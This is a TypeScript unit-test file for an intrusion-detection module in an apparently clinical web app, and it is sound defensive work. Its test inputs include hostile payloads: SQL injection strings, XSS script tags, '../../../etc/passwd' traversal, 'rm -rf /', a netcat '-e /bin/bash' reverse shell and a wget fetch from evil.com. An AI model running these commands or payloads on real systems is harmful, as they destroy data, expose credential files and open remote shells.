// src/lib/security/__tests__/intrusion-detection.test.ts
// Unit tests for intrusion detection module

import { describe, it, expect } from 'vitest';
import {
    checkSQLInjection,
    checkXSS,
    checkPathTraversal,
    checkCommandInjection,
    checkUserAgent,
    shouldBlockRequest,
} from '../intrusion-detection';

describe('Intrusion Detection', () => {
    describe('checkSQLInjection', () => {
        it('should detect basic SQL keywords', () => {
            expect(checkSQLInjection('SELECT * FROM users').detected).toBe(true);
            expect(checkSQLInjection("DROP TABLE patients").detected).toBe(true);
            expect(checkSQLInjection("DELETE FROM clinical_notes").detected).toBe(true);
        });

        it('should detect UNION SELECT injection', () => {
            expect(checkSQLInjection("1 UNION SELECT password FROM users").detected).toBe(true);
        });

        it('should detect SQL comment patterns', () => {
            expect(checkSQLInjection("admin'--").detected).toBe(true);
            expect(checkSQLInjection("1/*comment*/").detected).toBe(true);
        });

        it('should detect OR-based injection', () => {
            expect(checkSQLInjection("1 OR 1=1 OR 1").detected).toBe(true);
        });

        it('should NOT flag normal text', () => {
            expect(checkSQLInjection('John Doe').detected).toBe(false);
            expect(checkSQLInjection('patient@email.com').detected).toBe(false);
            expect(checkSQLInjection('123-45-6789').detected).toBe(false);
        });

        it('should return CRITICAL severity', () => {
            const result = checkSQLInjection("SELECT 1");
            expect(result.severity).toBe('CRITICAL');
            expect(result.threatType).toBe('SQL_INJECTION');
        });
    });

    describe('checkXSS', () => {
        it('should detect script tags', () => {
            expect(checkXSS('<script>alert("xss")</script>').detected).toBe(true);
            expect(checkXSS('<script src="evil.js">').detected).toBe(true);
        });

        it('should detect javascript: protocol', () => {
            expect(checkXSS('javascript:alert(1)').detected).toBe(true);
        });

        it('should detect event handler injection', () => {
            expect(checkXSS('onerror=alert(1)').detected).toBe(true);
            expect(checkXSS('onclick=malicious()').detected).toBe(true);
        });

        it('should detect document.cookie access', () => {
            expect(checkXSS('document.cookie').detected).toBe(true);
        });

        it('should detect eval calls', () => {
            expect(checkXSS('eval(userInput)').detected).toBe(true);
        });

        it('should NOT flag normal HTML entities', () => {
            expect(checkXSS('Patient name: John').detected).toBe(false);
            expect(checkXSS('Temperature > 98.6').detected).toBe(false);
        });

        it('should return HIGH severity', () => {
            const result = checkXSS('<script>x</script>');
            expect(result.severity).toBe('HIGH');
            expect(result.threatType).toBe('XSS_ATTEMPT');
        });
    });

    describe('checkPathTraversal', () => {
        it('should detect ../ patterns', () => {
            expect(checkPathTraversal('../../../etc/passwd').detected).toBe(true);
            expect(checkPathTraversal('..\\windows\\system32').detected).toBe(true);
        });

        it('should detect URL-encoded traversal', () => {
            expect(checkPathTraversal('%2e%2e%2f').detected).toBe(true);
            expect(checkPathTraversal('%2e%2e/').detected).toBe(true);
        });

        it('should detect double-encoded traversal', () => {
            expect(checkPathTraversal('%252e%252e%252f').detected).toBe(true);
        });

        it('should NOT flag normal paths', () => {
            expect(checkPathTraversal('/api/patients/123').detected).toBe(false);
            expect(checkPathTraversal('/notes/new').detected).toBe(false);
        });
    });

    describe('checkCommandInjection', () => {
        it('should detect shell metacharacters', () => {
            expect(checkCommandInjection('file; rm -rf /').detected).toBe(true);
            expect(checkCommandInjection('test && whoami').detected).toBe(true);
            expect(checkCommandInjection('data || cat /etc/passwd').detected).toBe(true);
        });

        it('should detect backtick command substitution', () => {
            expect(checkCommandInjection('`whoami`').detected).toBe(true);
        });

        it('should detect network tools', () => {
            expect(checkCommandInjection('nc host -e /bin/bash').detected).toBe(true);
            expect(checkCommandInjection('wget http://evil.com/shell.sh').detected).toBe(true);
        });

        it('should return CRITICAL severity', () => {
            const result = checkCommandInjection('test; id');
            expect(result.severity).toBe('CRITICAL');
            expect(result.threatType).toBe('COMMAND_INJECTION');
        });
    });

    describe('checkUserAgent', () => {
        it('should detect known attack tools', () => {
            expect(checkUserAgent('sqlmap/1.0').detected).toBe(true);
            expect(checkUserAgent('Mozilla Nikto/2.1.6').detected).toBe(true);
            expect(checkUserAgent('Nmap Scripting Engine').detected).toBe(true);
            expect(checkUserAgent('Burp Suite Professional').detected).toBe(true);
            expect(checkUserAgent('Acunetix WVS').detected).toBe(true);
        });

        it('should NOT flag legitimate browsers', () => {
            expect(checkUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0').detected).toBe(false);
            expect(checkUserAgent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) Safari/605.1.15').detected).toBe(false);
        });
    });

    describe('shouldBlockRequest', () => {
        it('should block CRITICAL threats', () => {
            const threats = [
                { detected: true, threatType: 'SQL_INJECTION' as const, severity: 'CRITICAL' as const, details: 'test' },
            ];
            expect(shouldBlockRequest(threats)).toBe(true);
        });

        it('should block SQL injection regardless of severity', () => {
            const threats = [
                { detected: true, threatType: 'SQL_INJECTION' as const, severity: 'HIGH' as const, details: 'test' },
            ];
            expect(shouldBlockRequest(threats)).toBe(true);
        });

        it('should NOT block LOW severity non-SQL threats', () => {
            const threats = [
                { detected: false, severity: 'LOW' as const },
            ];
            expect(shouldBlockRequest(threats)).toBe(false);
        });

        it('should handle empty threat array', () => {
            expect(shouldBlockRequest([])).toBe(false);
        });
    });
});
